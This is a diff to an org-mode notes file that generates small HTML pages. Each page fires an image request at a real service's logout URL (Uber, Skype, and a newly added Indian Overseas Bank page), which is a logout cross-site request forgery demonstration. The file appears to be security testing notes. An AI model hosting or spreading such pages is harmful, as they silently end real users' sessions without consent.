@@ -87,7 +87,7 @@ Check with corp extension in chrome
 * Uber logout
 #+BEGIN_SRC html :tangle  uberlogout.html
 <html>
-<head><title>Attacker</title></head>
+<head><title>Uber Logout</title></head>
 <body>
 <img src="https://riders.uber.com/logout"/>
 </body>
@@ -96,7 +96,7 @@ Check with corp extension in chrome
 * Skype logout
 #+BEGIN_SRC html :tangle skypelogout.html
 <html>
-<head><title>Attacker</title></head>
+<head><title>Skype Logout</title></head>
 <body>
 <img src="https://secure.skype.com/portal/logout"/>
 </body>
@@ -107,3 +107,12 @@ Check with corp extension in chrome
 https://superlogout.com
 #+END_EXAMPLE
 * SBI logout
+* IOB logout
+#+BEGIN_SRC html :tangle ioblogout.html
+<html>
+<head><title>IOB Logout</title></head>
+<body>
+<img src="https://www.iobnet.co.in/ibanking/logout.do">
+</body>
+</html>
+#+END_SRC
